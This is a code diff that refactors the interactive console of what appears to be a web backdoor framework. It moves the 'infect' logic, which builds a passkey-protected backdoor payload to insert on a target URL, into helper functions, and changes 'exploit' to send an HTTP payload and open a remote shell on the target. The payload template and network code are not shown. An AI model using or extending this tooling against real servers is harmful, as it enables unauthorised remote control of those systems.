@@ -1,9 +1,9 @@
-import re, base64, hashlib
+from functions       import *
+from framework.shell import *
 
-from functions import *
-import interface.cmdlib
+from interface import cmdlib
 
-class Start(interface.cmdlib.Cmd):
+class Start(cmdlib.Cmd):
 
     def preloop(self):
         clear()
@@ -39,54 +39,18 @@ class Start(interface.cmdlib.Cmd):
             self.CNF['LNK'] = dict()
 
         # update the LNK
-        self.update_opener()
-
-
-    # for general code shortening, the opener CNF vars
-    # where renamed into LNK.
-    def update_opener(self):
-        def gen_srvhash():
-            domain  = self.CNF['LNK']['DOMAIN']
-            md5     = hashlib.md5(domain)
-            hexVal  = md5.hexdigest()
-            b64Val  = base64.b64encode(hexVal)
-            srvhash = b64Val[:8]
-            self.CNF['LNK']['HASH'] = srvhash
-
-        def gen_payload():
-            srvhash  = self.CNF['LNK']['HASH']
-            backdoor = self.CNF['SET']['BACKDOOR']
-            passkey  = self.CNF['SET']['PASSKEY'].upper().replace('-','_')
-            rawPayload = backdoor.replace('%%PASSKEY%%',passkey)
-            payload    = rawPayload.replace('%%SRVHASH%%',srvhash)
-            self.CNF['LNK']['BACKDOOR'] = payload
-
-        # another ugly line to shorten the function
-        self.CNF['LNK']['DOMAIN'] = 'x'
-
-        target = self.CNF['SET']['TARGET']
-        regex  = '^https?://(.+?)(?:$|/)'
-        try:    domain = re.findall(regex, target)[0]
-        except: domain = ''
-        if domain and len(target)>13:
-            self.CNF['LNK']['URL']    = target
-            self.CNF['LNK']['DOMAIN'] = domain
-        else:
-            try: del self.CNF['LNK']['URL']
-            except: pass
-
-        gen_srvhash()
-        gen_payload()
-
-        self.CNF['LNK']['PASSKEY'] = self.CNF['SET']['PASSKEY']
-        if self.CNF['LNK']['PASSKEY'] == "%%SRVHASH%%":
-            self.CNF['LNK']['PASSKEY'] = self.CNF['LNK']['HASH']
-
+        self.CNF['LNK'] = update_opener(self.CNF)
 
     ######################
     ### COMMAND: clear ###
     def do_clear(self, line):
         clear()
+
+    ######################
+    ### COMMAND: clear ###
+    def do_debug(self, line):
+        from pprint import pprint
+        pprint(self.CNF)
 
     #####################
     ### COMMAND: exit ###
@@ -126,7 +90,7 @@ class Start(interface.cmdlib.Cmd):
                     from usr.settings import comply
                     if comply(self.CNF['SET']):
                         show(var, self.CNF['SET'][var])
-                        self.update_opener()
+                        self.CNF['LNK'] = update_opener(self.CNF)
                     else:
                         self.CNF['SET'][var] = backup
                 else:
@@ -143,35 +107,22 @@ class Start(interface.cmdlib.Cmd):
     #######################
     ### COMMAND: infect ###
     def do_infect(self, line):
-        if 'URL' in self.CNF['LNK'] \
-        or self.CNF['SET']['PASSKEY'] != '%%SRVHASH%%':
-            payload = self.CNF['LNK']['BACKDOOR']
-            length  = len(payload)
-            print ''
-            print 'To infect the current target'
-            print 'Insert this backdoor on targeted URL:'
-            print ''
-            print ''+'='*length
-            print ''+color(34)+payload+color(0)
-            print ''+'='*length
-            print ''
-        else:
-            err = "Undefined target, please enable it with '%s'"
-            print P_err+err % 'set TARGET <backdoored-url>'
+        cmd_infect(self.CNF['LNK']['BACKDOOR'])
 
     ########################
     ### COMMAND: exploit ###
     def do_exploit(self, line):
         if 'URL' in self.CNF['LNK']:
-            import framework.exploit
-            exploitation = framework.exploit.Start(self.CNF)
-            if exploitation.success:
-                self.CNF['SRV'] = exploitation.remotevars
+            print P_inf+'Sending http payload...'
+            from network import server
+            link = server.Link(self.CNF)
+            if link.open():
+                self.CNF['SRV'] = link.srv_vars
                 import remoteShell
                 shell = remoteShell.Start()
                 shell.setConfig(self.CNF)
                 shell.cmdloop()
-                exploitation.close()
+                link.close()
         else:
             err = "Undefined target, please enable it with '%s'"
             print P_err+err % 'set TARGET <backdoored-url>'
